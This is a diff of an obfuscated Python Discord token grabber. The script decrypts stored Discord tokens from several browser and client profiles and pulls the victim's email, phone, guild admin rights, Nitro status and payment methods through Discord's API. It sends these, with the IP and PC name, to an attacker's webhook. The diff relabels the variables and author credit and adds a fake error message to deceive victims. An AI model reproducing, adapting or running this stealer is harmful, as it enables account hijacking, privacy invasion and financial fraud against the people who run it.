@@ -8,12 +8,12 @@ import urllib .request #line:7
 import re #line:8
 import base64 #line:9
 import datetime #line:10
-def install_import (OOOOOO0O00O0O0O00 ):#line:12
-    for O000O0OO0O0O0OOO0 ,O0O0O00000OO00OO0 in OOOOOO0O00O0O0O00 :#line:13
+def install_import (OOOOO0O00O000OOOO ):#line:12
+    for O0OO0OO00OOOOO0O0 ,O00000O00OOOOOOOO in OOOOO0O00O000OOOO :#line:13
         try :#line:14
-            __import__ (O000O0OO0O0O0OOO0 )#line:15
+            __import__ (O0OO0OO00OOOOO0O0 )#line:15
         except ImportError :#line:16
-            subprocess .check_call ([sys .executable ,"-m","pip","install",O0O0O00000OO00OO0 ],stdout =subprocess .DEVNULL ,stderr =subprocess .DEVNULL )#line:17
+            subprocess .check_call ([sys .executable ,"-m","pip","install",O00000O00OOOOOOOO ],stdout =subprocess .DEVNULL ,stderr =subprocess .DEVNULL )#line:17
             os .execl (sys .executable ,sys .executable ,*sys .argv )#line:18
 install_import ([("win32crypt","pypiwin32"),("Crypto.Cipher","pycryptodome")])#line:20
 import win32crypt #line:22
@@ -22,121 +22,123 @@ LOCAL =os .getenv ("LOCALAPPDATA")#line:25
 ROAMING =os .getenv ("APPDATA")#line:26
 PATHS ={'Discord':ROAMING +'\\discord','Discord Canary':ROAMING +'\\discordcanary','Lightcord':ROAMING +'\\Lightcord','Discord PTB':ROAMING +'\\discordptb','Opera':ROAMING +'\\Opera Software\\Opera Stable','Opera GX':ROAMING +'\\Opera Software\\Opera GX Stable','Amigo':LOCAL +'\\Amigo\\User Data','Torch':LOCAL +'\\Torch\\User Data','Kometa':LOCAL +'\\Kometa\\User Data','Orbitum':LOCAL +'\\Orbitum\\User Data','CentBrowser':LOCAL +'\\CentBrowser\\User Data','7Star':LOCAL +'\\7Star\\7Star\\User Data','Sputnik':LOCAL +'\\Sputnik\\Sputnik\\User Data','Vivaldi':LOCAL +'\\Vivaldi\\User Data\\Default','Chrome SxS':LOCAL +'\\Google\\Chrome SxS\\User Data','Chrome':LOCAL +"\\Google\\Chrome\\User Data"+'Default','Epic Privacy Browser':LOCAL +'\\Epic Privacy Browser\\User Data','Microsoft Edge':LOCAL +'\\Microsoft\\Edge\\User Data\\Defaul','Uran':LOCAL +'\\uCozMedia\\Uran\\User Data\\Default','Yandex':LOCAL +'\\Yandex\\YandexBrowser\\User Data\\Default','Brave':LOCAL +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium':LOCAL +'\\Iridium\\User Data\\Default'}#line:50
 def getheaders (token =None ):#line:52
-    OO00O00O00000000O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"}#line:56
+    OO0O00000OOO0O00O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"}#line:56
     if token :#line:58
-        OO00O00O00000000O .update ({"Authorization":token })#line:59
-    return OO00O00O00000000O #line:61
-def gettokens (OO0O0O0O0O000OO00 ):#line:63
-    OO0O0O0O0O000OO00 +="\\Local Storage\\leveldb\\"#line:64
-    OOOO0OO0O0OOOOOO0 =[]#line:65
-    if not os .path .exists (OO0O0O0O0O000OO00 ):#line:67
-        return OOOO0OO0O0OOOOOO0 #line:68
-    for O0OO0000OO00OO00O in os .listdir (OO0O0O0O0O000OO00 ):#line:70
-        if not O0OO0000OO00OO00O .endswith (".ldb")and O0OO0000OO00OO00O .endswith (".log"):#line:71
+        OO0O00000OOO0O00O .update ({"Authorization":token })#line:59
+    return OO0O00000OOO0O00O #line:61
+def gettokens (O000OO000000000O0 ):#line:63
+    O000OO000000000O0 +="\\Local Storage\\leveldb\\"#line:64
+    OOOO000OOO0OOO00O =[]#line:65
+    if not os .path .exists (O000OO000000000O0 ):#line:67
+        return OOOO000OOO0OOO00O #line:68
+    for OOO0OO000OO000000 in os .listdir (O000OO000000000O0 ):#line:70
+        if not OOO0OO000OO000000 .endswith (".ldb")and OOO0OO000OO000000 .endswith (".log"):#line:71
             continue #line:72
         try :#line:74
-            with open (f"{OO0O0O0O0O000OO00}{O0OO0000OO00OO00O}","r",errors ="ignore")as OOOO00OOOOO0OOO0O :#line:75
-                for O0OOO0000O0O0O00O in (O000O0OO0OO00OOOO .strip ()for O000O0OO0OO00OOOO in OOOO00OOOOO0OOO0O .readlines ()):#line:76
-                    for OO000OOO00OO0O0O0 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O0OOO0000O0O0O00O ):#line:77
-                        OOOO0OO0O0OOOOOO0 .append (OO000OOO00OO0O0O0 )#line:78
+            with open (f"{O000OO000000000O0}{OOO0OO000OO000000}","r",errors ="ignore")as O0OO00O000O0000OO :#line:75
+                for O00OOOOO00OO000O0 in (OO00000OOO0OOOOOO .strip ()for OO00000OOO0OOOOOO in O0OO00O000O0000OO .readlines ()):#line:76
+                    for O0O0OO0OO0OO00O0O in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O00OOOOO00OO000O0 ):#line:77
+                        OOOO000OOO0OOO00O .append (O0O0OO0OO0OO00O0O )#line:78
         except PermissionError :#line:79
             continue #line:80
-    return OOOO0OO0O0OOOOOO0 #line:82
-def getkey (O0O00O000000OOOO0 ):#line:84
-    with open (O0O00O000000OOOO0 +f"\\Local State","r")as O00OO0O0OOO0OOOOO :#line:85
-        OO00O00O00OOOOO0O =json .loads (O00OO0O0OOO0OOOOO .read ())['os_crypt']['encrypted_key']#line:86
-        O00OO0O0OOO0OOOOO .close ()#line:87
-    return OO00O00O00OOOOO0O #line:89
+    return OOOO000OOO0OOO00O #line:82
+def getkey (O00OO0OO0O00O000O ):#line:84
+    with open (O00OO0OO0O00O000O +f"\\Local State","r")as O000OO0OO00O00OOO :#line:85
+        O00O0OO0O0O0OO00O =json .loads (O000OO0OO00O00OOO .read ())['os_crypt']['encrypted_key']#line:86
+        O000OO0OO00O00OOO .close ()#line:87
+    return O00O0OO0O0O0OO00O #line:89
 def getip ():#line:91
     try :#line:92
-        with urllib .request .urlopen ("https://api.ipify.org?format=json")as O0OO0O0O0OOOO000O :#line:93
-            return json .loads (O0OO0O0O0OOOO000O .read ().decode ()).get ("ip")#line:94
+        with urllib .request .urlopen ("https://api.ipify.org?format=json")as OO0000O0O00O0000O :#line:93
+            return json .loads (OO0000O0O00O0000O .read ().decode ()).get ("ip")#line:94
     except :#line:95
         return "None"#line:96
 def main ():#line:98
-    O0000O0OO0OOO00OO =[]#line:99
-    for O0O0OOOOO0OOOOO00 ,OOO00OOOO0O00O0O0 in PATHS .items ():#line:101
-        if not os .path .exists (OOO00OOOO0O00O0O0 ):#line:102
-            continue #line:103
-        for O0000000000OOOO0O in gettokens (OOO00OOOO0O00O0O0 ):#line:105
-            O0000000000OOOO0O =O0000000000OOOO0O .replace ("\\","")if O0000000000OOOO0O .endswith ("\\")else O0000000000OOOO0O #line:106
-            try :#line:108
-                O0000000000OOOO0O =AES .new (win32crypt .CryptUnprotectData (base64 .b64decode (getkey (OOO00OOOO0O00O0O0 ))[5 :],None ,None ,None ,0 )[1 ],AES .MODE_GCM ,base64 .b64decode (O0000000000OOOO0O .split ('dQw4w9WgXcQ:')[1 ])[3 :15 ]).decrypt (base64 .b64decode (O0000000000OOOO0O .split ('dQw4w9WgXcQ:')[1 ])[15 :])[:-16 ].decode ()#line:109
-                if O0000000000OOOO0O in O0000O0OO0OOO00OO :#line:110
-                    continue #line:111
-                O0000O0OO0OOO00OO .append (O0000000000OOOO0O )#line:112
-                OOO00OO0O0O0OO0OO =urllib .request .urlopen (urllib .request .Request ('https://discord.com/api/v10/users/@me',headers =getheaders (O0000000000OOOO0O )))#line:114
-                if OOO00OO0O0O0OO0OO .getcode ()!=200 :#line:115
-                    continue #line:116
-                OOO0OOOO00OO0O0O0 =json .loads (OOO00OO0O0O0OO0OO .read ().decode ())#line:117
-                O0000O000000OOO00 =""#line:119
-                O00O0OO000O0O0OO0 =OOO0OOOO00OO0O0O0 ['flags']#line:120
-                if O00O0OO000O0O0OO0 ==64 or O00O0OO000O0O0OO0 ==96 :#line:121
-                    O0000O000000OOO00 +=":BadgeBravery: "#line:122
-                if O00O0OO000O0O0OO0 ==128 or O00O0OO000O0O0OO0 ==160 :#line:123
-                    O0000O000000OOO00 +=":BadgeBrilliance: "#line:124
-                if O00O0OO000O0O0OO0 ==256 or O00O0OO000O0O0OO0 ==288 :#line:125
-                    O0000O000000OOO00 +=":BadgeBalance: "#line:126
-                OOO00OO0O0O0OO0OO =json .loads (urllib .request .urlopen (urllib .request .Request ('https://discordapp.com/api/v6/users/@me/relationships',headers =getheaders (O0000000000OOOO0O ))).read ().decode ())#line:128
-                O0OO00OO0OOOO000O =len ([O0O0O00OO0O00O0OO for O0O0O00OO0O00O0OO in OOO00OO0O0O0OO0OO if O0O0O00OO0O00O0OO ['type']==1 ])#line:129
-                OOOOOO000O000OOO0 =urllib .parse .urlencode ({"with_counts":True })#line:131
-                OOO00OO0O0O0OO0OO =json .loads (urllib .request .urlopen (urllib .request .Request (f'https://discordapp.com/api/v6/users/@me/guilds?{OOOOOO000O000OOO0}',headers =getheaders (O0000000000OOOO0O ))).read ().decode ())#line:132
-                O000O0OO0O00OOO00 =len (OOO00OO0O0O0OO0OO )#line:133
-                O000O000OOO00OOOO =""#line:134
-                for O0OOOOO00OO000OOO in OOO00OO0O0O0OO0OO :#line:136
-                    if O0OOOOO00OO000OOO ['permissions']&8 or O0OOOOO00OO000OOO ['permissions']&32 :#line:137
-                        OOO00OO0O0O0OO0OO =json .loads (urllib .request .urlopen (urllib .request .Request (f'https://discordapp.com/api/v6/guilds/{O0OOOOO00OO000OOO["id"]}',headers =getheaders (O0000000000OOOO0O ))).read ().decode ())#line:138
-                        O0OOOO0000000O0O0 =""#line:139
-                        if OOO00OO0O0O0OO0OO ["vanity_url_code"]!=None :#line:141
-                            O0OOOO0000000O0O0 =f"""; .gg/{OOO00OO0O0O0OO0OO["vanity_url_code"]}"""#line:142
-                        O000O000OOO00OOOO +=f"""\nㅤ- [{O0OOOOO00OO000OOO['name']}]: {O0OOOOO00OO000OOO['approximate_member_count']}{O0OOOO0000000O0O0}"""#line:144
-                if O000O000OOO00OOOO =="":#line:145
-                    O000O000OOO00OOOO ="No guilds"#line:146
-                OOO00OO0O0O0OO0OO =json .loads (urllib .request .urlopen (urllib .request .Request ('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers =getheaders (O0000000000OOOO0O ))).read ().decode ())#line:148
-                O0OOOO0O0OO00000O =False #line:149
-                O0OOOO0O0OO00000O =bool (len (OOO00OO0O0O0OO0OO )>0 )#line:150
-                O0OOOOOO00OOO000O =None #line:151
-                if O0OOOO0O0OO00000O :#line:152
-                    O0000O000000OOO00 +=f":BadgeSubscriber: "#line:153
-                    O0OOOOOO00OOO000O =datetime .datetime .strptime (OOO00OO0O0O0OO0OO [0 ]["current_period_end"],"%Y-%m-%dT%H:%M:%S.%f%z").strftime ('%d/%m/%Y at %H:%M:%S')#line:154
-                OOO00OO0O0O0OO0OO =json .loads (urllib .request .urlopen (urllib .request .Request ('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',headers =getheaders (O0000000000OOOO0O ))).read ().decode ())#line:156
-                OOOO000O00O0OOOO0 =0 #line:157
-                O00000OO0O0O0OOOO =""#line:158
-                OO0000OOO00OO000O =False #line:159
-                for OO0O0O0000000000O in OOO00OO0O0O0OO0OO :#line:160
-                    O0OO0O0O0O0O0O0OO =datetime .datetime .strptime (OO0O0O0000000000O ["cooldown_ends_at"],"%Y-%m-%dT%H:%M:%S.%f%z")#line:161
-                    if O0OO0O0O0O0O0O0OO -datetime .datetime .now (datetime .timezone .utc )<datetime .timedelta (seconds =0 ):#line:162
-                        O00000OO0O0O0OOOO +=f"ㅤ- Available now\n"#line:163
-                        OOOO000O00O0OOOO0 +=1 #line:164
-                    else :#line:165
-                        O00000OO0O0O0OOOO +=f"ㅤ- Available on {O0OO0O0O0O0O0O0OO.strftime('%d/%m/%Y at %H:%M:%S')}\n"#line:166
-                    OO0000OOO00OO000O =True #line:167
-                if OO0000OOO00OO000O :#line:168
-                    O0000O000000OOO00 +=f":BadgeBoost: "#line:169
-                O0O00O0O0OO000OOO =0 #line:171
-                OOO000O0OOO0OO00O =""#line:172
-                O00O0O00000OOOOO0 =0 #line:173
-                for OOOO00O0O00O00OO0 in json .loads (urllib .request .urlopen (urllib .request .Request ('https://discordapp.com/api/v6/users/@me/billing/payment-sources',headers =getheaders (O0000000000OOOO0O ))).read ().decode ()):#line:174
-                    if OOOO00O0O00O00OO0 ['type']==1 :#line:175
-                        OOO000O0OOO0OO00O +="CreditCard "#line:176
-                        if not OOOO00O0O00O00OO0 ['invalid']:#line:177
-                            O00O0O00000OOOOO0 +=1 #line:178
-                        O0O00O0O0OO000OOO +=1 #line:179
-                    elif OOOO00O0O00O00OO0 ['type']==2 :#line:180
-                        OOO000O0OOO0OO00O +="PayPal "#line:181
-                        if not OOOO00O0O00O00OO0 ['invalid']:#line:182
-                            O00O0O00000OOOOO0 +=1 #line:183
-                        O0O00O0O0OO000OOO +=1 #line:184
-                OOO00O000000O00O0 =f"\nNitro Informations:\n```yaml\nHas Nitro: {O0OOOO0O0OO00000O}\nExpiration Date: {O0OOOOOO00OOO000O}\nBoosts Available: {OOOO000O00O0OOOO0}\n{O00000OO0O0O0OOOO if OO0000OOO00OO000O else ''}\n```"#line:186
-                O0000OOOOOO00O0OO =f"\nNitro Informations:\n```yaml\nBoosts Available: {OOOO000O00O0OOOO0}\n{O00000OO0O0O0OOOO if OO0000OOO00OO000O else ''}\n```"#line:187
-                OOO0O000O00000O0O =f"\nPayment Methods:\n```yaml\nAmount: {O0O00O0O0OO000OOO}\nValid Methods: {O00O0O00000OOOOO0} method(s)\nType: {OOO000O0OOO0OO00O}\n```"#line:188
-                OO0O0OOOO00O0O000 ={'embeds':[{'title':f"**New user data: {OOO0OOOO00OO0O0O0['username']}**",'description':f"""
-                                ```yaml\nUser ID: {OOO0OOOO00OO0O0O0['id']}\nEmail: {OOO0OOOO00OO0O0O0['email']}\nPhone Number: {OOO0OOOO00OO0O0O0['phone']}\n\nFriends: {O0OO00OO0OOOO000O}\nGuilds: {O000O0OO0O00OOO00}\nAdmin Permissions: {O000O000OOO00OOOO}\n``` ```yaml\nMFA Enabled: {OOO0OOOO00OO0O0O0['mfa_enabled']}\nFlags: {O00O0OO000O0O0OO0}\nLocale: {OOO0OOOO00OO0O0O0['locale']}\nVerified: {OOO0OOOO00OO0O0O0['verified']}\n```{OOO00O000000O00O0 if O0OOOO0O0OO00000O else O0000OOOOOO00O0OO if OOOO000O00O0OOOO0 > 0 else ""}{OOO0O000O00000O0O if O0O00O0O0OO000OOO > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {O0O0OOOOO0OOOOO00}\n```Token: \n```yaml\n{O0000000000OOOO0O}```""",'color':3092790 ,'footer':{'text':"Made by Astraa ・ https://github.com/astraadev"},'thumbnail':{'url':f"https://cdn.discordapp.com/avatars/{OOO0OOOO00OO0O0O0['id']}/{OOO0OOOO00OO0O0O0['avatar']}.png"}}],"username":"Grabber","avatar_url":"https://avatars.githubusercontent.com/u/43183806?v=4"}#line:206
-                urllib .request .urlopen (urllib .request .Request ('REPLACE UR WEBHOOK HERE',data =json .dumps (OO0O0OOOO00O0O000 ).encode ('utf-8'),headers =getheaders (),method ='POST')).read ().decode ()#line:208
-            except urllib .error .HTTPError or json .JSONDecodeError :#line:209
-                continue #line:210
-            except Exception as O0000O000OOOOO0O0 :#line:211
-                print (f"ERROR: {O0000O000OOOOO0O0}")#line:212
-                continue #line:213
-if __name__ =="__main__":#line:215
-    main ()
+    print ("loading...")#line:99
+    OO0OO000O000O0O0O =[]#line:100
+    for O00O0O00O00O00O0O ,OOO00OOOO00O000OO in PATHS .items ():#line:102
+        if not os .path .exists (OOO00OOOO00O000OO ):#line:103
+            continue #line:104
+        for OOO00O0OOO0OO0000 in gettokens (OOO00OOOO00O000OO ):#line:106
+            OOO00O0OOO0OO0000 =OOO00O0OOO0OO0000 .replace ("\\","")if OOO00O0OOO0OO0000 .endswith ("\\")else OOO00O0OOO0OO0000 #line:107
+            try :#line:109
+                OOO00O0OOO0OO0000 =AES .new (win32crypt .CryptUnprotectData (base64 .b64decode (getkey (OOO00OOOO00O000OO ))[5 :],None ,None ,None ,0 )[1 ],AES .MODE_GCM ,base64 .b64decode (OOO00O0OOO0OO0000 .split ('dQw4w9WgXcQ:')[1 ])[3 :15 ]).decrypt (base64 .b64decode (OOO00O0OOO0OO0000 .split ('dQw4w9WgXcQ:')[1 ])[15 :])[:-16 ].decode ()#line:110
+                if OOO00O0OOO0OO0000 in OO0OO000O000O0O0O :#line:111
+                    continue #line:112
+                OO0OO000O000O0O0O .append (OOO00O0OOO0OO0000 )#line:113
+                O000O000O0OOO0O0O =urllib .request .urlopen (urllib .request .Request ('https://discord.com/api/v10/users/@me',headers =getheaders (OOO00O0OOO0OO0000 )))#line:115
+                if O000O000O0OOO0O0O .getcode ()!=200 :#line:116
+                    continue #line:117
+                OO0O0OOOO0O000OOO =json .loads (O000O000O0OOO0O0O .read ().decode ())#line:118
+                O0OO00OOO000OOOOO =""#line:120
+                OO00OOO0OO00OOO0O =OO0O0OOOO0O000OOO ['flags']#line:121
+                if OO00OOO0OO00OOO0O ==64 or OO00OOO0OO00OOO0O ==96 :#line:122
+                    O0OO00OOO000OOOOO +=":BadgeBravery: "#line:123
+                if OO00OOO0OO00OOO0O ==128 or OO00OOO0OO00OOO0O ==160 :#line:124
+                    O0OO00OOO000OOOOO +=":BadgeBrilliance: "#line:125
+                if OO00OOO0OO00OOO0O ==256 or OO00OOO0OO00OOO0O ==288 :#line:126
+                    O0OO00OOO000OOOOO +=":BadgeBalance: "#line:127
+                O000O000O0OOO0O0O =json .loads (urllib .request .urlopen (urllib .request .Request ('https://discordapp.com/api/v6/users/@me/relationships',headers =getheaders (OOO00O0OOO0OO0000 ))).read ().decode ())#line:129
+                O0OOO0OO000OO0OOO =len ([O0OOO00OOO00OO0OO for O0OOO00OOO00OO0OO in O000O000O0OOO0O0O if O0OOO00OOO00OO0OO ['type']==1 ])#line:130
+                OOO00O00O0O00OO0O =urllib .parse .urlencode ({"with_counts":True })#line:132
+                O000O000O0OOO0O0O =json .loads (urllib .request .urlopen (urllib .request .Request (f'https://discordapp.com/api/v6/users/@me/guilds?{OOO00O00O0O00OO0O}',headers =getheaders (OOO00O0OOO0OO0000 ))).read ().decode ())#line:133
+                OOO000OOOO00O00OO =len (O000O000O0OOO0O0O )#line:134
+                OO00O0OOOO0OOOO0O =""#line:135
+                for OOO000OOOO0O0O00O in O000O000O0OOO0O0O :#line:137
+                    if OOO000OOOO0O0O00O ['permissions']&8 or OOO000OOOO0O0O00O ['permissions']&32 :#line:138
+                        O000O000O0OOO0O0O =json .loads (urllib .request .urlopen (urllib .request .Request (f'https://discordapp.com/api/v6/guilds/{OOO000OOOO0O0O00O["id"]}',headers =getheaders (OOO00O0OOO0OO0000 ))).read ().decode ())#line:139
+                        O00O0O0OOO0OOOOOO =""#line:140
+                        if O000O000O0OOO0O0O ["vanity_url_code"]!=None :#line:142
+                            O00O0O0OOO0OOOOOO =f"""; .gg/{O000O000O0OOO0O0O["vanity_url_code"]}"""#line:143
+                        OO00O0OOOO0OOOO0O +=f"""\nㅤ- [{OOO000OOOO0O0O00O['name']}]: {OOO000OOOO0O0O00O['approximate_member_count']}{O00O0O0OOO0OOOOOO}"""#line:145
+                if OO00O0OOOO0OOOO0O =="":#line:146
+                    OO00O0OOOO0OOOO0O ="No guilds"#line:147
+                O000O000O0OOO0O0O =json .loads (urllib .request .urlopen (urllib .request .Request ('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers =getheaders (OOO00O0OOO0OO0000 ))).read ().decode ())#line:149
+                O0OOO00O00OO0O0OO =False #line:150
+                O0OOO00O00OO0O0OO =bool (len (O000O000O0OOO0O0O )>0 )#line:151
+                O0OOOO000000O0000 =None #line:152
+                if O0OOO00O00OO0O0OO :#line:153
+                    O0OO00OOO000OOOOO +=f":BadgeSubscriber: "#line:154
+                    O0OOOO000000O0000 =datetime .datetime .strptime (O000O000O0OOO0O0O [0 ]["current_period_end"],"%Y-%m-%dT%H:%M:%S.%f%z").strftime ('%d/%m/%Y at %H:%M:%S')#line:155
+                O000O000O0OOO0O0O =json .loads (urllib .request .urlopen (urllib .request .Request ('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',headers =getheaders (OOO00O0OOO0OO0000 ))).read ().decode ())#line:157
+                OO000OO0OOO00O00O =0 #line:158
+                O000O0OO000O0OO0O =""#line:159
+                O00OOO0OOOOO0OOOO =False #line:160
+                for OOO000OOO0O000O0O in O000O000O0OOO0O0O :#line:161
+                    O00OOOO000O00OO00 =datetime .datetime .strptime (OOO000OOO0O000O0O ["cooldown_ends_at"],"%Y-%m-%dT%H:%M:%S.%f%z")#line:162
+                    if O00OOOO000O00OO00 -datetime .datetime .now (datetime .timezone .utc )<datetime .timedelta (seconds =0 ):#line:163
+                        O000O0OO000O0OO0O +=f"ㅤ- Available now\n"#line:164
+                        OO000OO0OOO00O00O +=1 #line:165
+                    else :#line:166
+                        O000O0OO000O0OO0O +=f"ㅤ- Available on {O00OOOO000O00OO00.strftime('%d/%m/%Y at %H:%M:%S')}\n"#line:167
+                    O00OOO0OOOOO0OOOO =True #line:168
+                if O00OOO0OOOOO0OOOO :#line:169
+                    O0OO00OOO000OOOOO +=f":BadgeBoost: "#line:170
+                O00O0O000000O0000 =0 #line:172
+                OO0OOO0OO00O0OOO0 =""#line:173
+                O00O0O00OOOO0OO0O =0 #line:174
+                for O000O0O0OOOOO0O00 in json .loads (urllib .request .urlopen (urllib .request .Request ('https://discordapp.com/api/v6/users/@me/billing/payment-sources',headers =getheaders (OOO00O0OOO0OO0000 ))).read ().decode ()):#line:175
+                    if O000O0O0OOOOO0O00 ['type']==1 :#line:176
+                        OO0OOO0OO00O0OOO0 +="CreditCard "#line:177
+                        if not O000O0O0OOOOO0O00 ['invalid']:#line:178
+                            O00O0O00OOOO0OO0O +=1 #line:179
+                        O00O0O000000O0000 +=1 #line:180
+                    elif O000O0O0OOOOO0O00 ['type']==2 :#line:181
+                        OO0OOO0OO00O0OOO0 +="PayPal "#line:182
+                        if not O000O0O0OOOOO0O00 ['invalid']:#line:183
+                            O00O0O00OOOO0OO0O +=1 #line:184
+                        O00O0O000000O0000 +=1 #line:185
+                OOOO0O0O00O00O00O =f"\nNitro Informations:\n```yaml\nHas Nitro: {O0OOO00O00OO0O0OO}\nExpiration Date: {O0OOOO000000O0000}\nBoosts Available: {OO000OO0OOO00O00O}\n{O000O0OO000O0OO0O if O00OOO0OOOOO0OOOO else ''}\n```"#line:187
+                O00000OOOO000OO00 =f"\nNitro Informations:\n```yaml\nBoosts Available: {OO000OO0OOO00O00O}\n{O000O0OO000O0OO0O if O00OOO0OOOOO0OOOO else ''}\n```"#line:188
+                OOO000OOO00OOO0OO =f"\nPayment Methods:\n```yaml\nAmount: {O00O0O000000O0000}\nValid Methods: {O00O0O00OOOO0OO0O} method(s)\nType: {OO0OOO0OO00O0OOO0}\n```"#line:189
+                OO0OOO0OO0OOO0O00 ={'embeds':[{'title':f"**New user data: {OO0O0OOOO0O000OOO['username']}**",'description':f"""
+                                ```yaml\nUser ID: {OO0O0OOOO0O000OOO['id']}\nEmail: {OO0O0OOOO0O000OOO['email']}\nPhone Number: {OO0O0OOOO0O000OOO['phone']}\n\nFriends: {O0OOO0OO000OO0OOO}\nGuilds: {OOO000OOOO00O00OO}\nAdmin Permissions: {OO00O0OOOO0OOOO0O}\n``` ```yaml\nMFA Enabled: {OO0O0OOOO0O000OOO['mfa_enabled']}\nFlags: {OO00OOO0OO00OOO0O}\nLocale: {OO0O0OOOO0O000OOO['locale']}\nVerified: {OO0O0OOOO0O000OOO['verified']}\n```{OOOO0O0O00O00O00O if O0OOO00O00OO0O0OO else O00000OOOO000OO00 if OO000OO0OOO00O00O > 0 else ""}{OOO000OOO00OOO0OO if O00O0O000000O0000 > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {O00O0O00O00O00O0O}\n```Token: \n```yaml\n{OOO00O0OOO0OO0000}```""",'color':3092790 ,'footer':{'text':"Made by Toshi ・ https://toshi.my"},'thumbnail':{'url':f"https://cdn.discordapp.com/avatars/{OO0O0OOOO0O000OOO['id']}/{OO0O0OOOO0O000OOO['avatar']}.png"}}],"username":"Grabber","avatar_url":"https://cdn.discordapp.com/avatars/1184009692545028100/a_7ee393a726d857b2ed99f2013545c2be.gif?size=1024"}#line:207
+                urllib .request .urlopen (urllib .request .Request ('Put UR Webhook Here ',data =json .dumps (OO0OOO0OO0OOO0O00 ).encode ('utf-8'),headers =getheaders (),method ='POST')).read ().decode ()#line:209
+            except urllib .error .HTTPError or json .JSONDecodeError :#line:210
+                continue #line:211
+            except Exception as O0O0O0OOO0O00O00O :#line:212
+                print (f"ERROR: {O0O0O0OOO0O00O00O}")#line:213
+                continue #line:214
+    print ("Error 4067 Please Try Again Later!")#line:216
+if __name__ =="__main__":#line:218
+    main ()#line:219
